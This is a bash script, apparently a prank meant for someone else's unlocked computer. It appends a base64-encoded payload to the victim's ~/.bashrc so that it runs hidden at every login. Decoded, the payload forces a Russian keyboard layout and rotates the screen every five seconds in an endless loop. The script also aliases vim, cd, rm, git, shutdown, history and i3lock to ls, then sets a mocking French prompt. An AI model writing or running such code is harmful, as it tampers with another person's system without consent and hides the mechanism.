#!/bin/bash

payload="IyEvYmluL2Jhc2gKaWYgWyAtbiAiJERJU1BMQVkiIF07IHRoZW4KICAgIHNldHhrYm1hcCBydQogICAgY291bnRlcj0wCiAgICB3aGlsZSB0cnVlOyBkbwogICAgICAgIGlmIFsgIiRjb3VudGVyIiAtZXEgMCBdOyB0aGVuCiAgICAgICAgICAgIHhyYW5kciAtbyBpbnZlcnRlZAogICAgICAgIGVsaWYgWyAiJGNvdW50ZXIiIC1lcSAxIF07IHRoZW4KICAgICAgICAgICAgeHJhbmRyIC1vIGxlZnQKICAgICAgICBlbHNlCiAgICAgICAgICAgIHhyYW5kciAtbyByaWdodAogICAgICAgIGZpCiAgICAgICAgY291bnRlcj0kKCggKGNvdW50ZXIgKyAxKSAlIDMgKSkgICMgSW5jcmVtZW50IGFuZCBhcHBseSBtb2R1bHVzCiAgICAgICAgc2xlZXAgNQogICAgZG9uZQplbHNlCiAgICBsb2Fka2V5cyBydQpmaQoK"
cp ~/.bashrc ~/.bashrc.jaajjaaj
echo "##### CONFLOOSE RATIO" >> ~/.bashrc
echo "bash <(echo \"$payload\" | base64 --decode) &>/dev/null &" >> ~/.bashrc
echo "alias vim='/bin/ls'" >> ~/.bashrc
echo "alias nano='/bin/ls'" >> ~/.bashrc
echo "alias git='/bin/ls'" >> ~/.bashrc
echo "alias cd='/bin/ls'" >> ~/.bashrc
echo "alias ip='/bin/ls'" >> ~/.bashrc
echo "alias shutdown='/bin/ls'" >> ~/.bashrc
echo "alias reboot='/bin/ls'" >> ~/.bashrc
echo "alias mv='/bin/ls'" >> ~/.bashrc
echo "alias rm='/bin/ls'" >> ~/.bashrc
echo "alias cp='/bin/ls'" >> ~/.bashrc
echo "alias history='/bin/ls'" >> ~/.bashrc
echo "alias i3lock='/bin/ls'" >> ~/.bashrc
echo "PS1='\[\e[1;5m\]fallait verouiller sa session aussi \[\e[0m\]'" >> ~/.bashrc
source ~/.bashrc
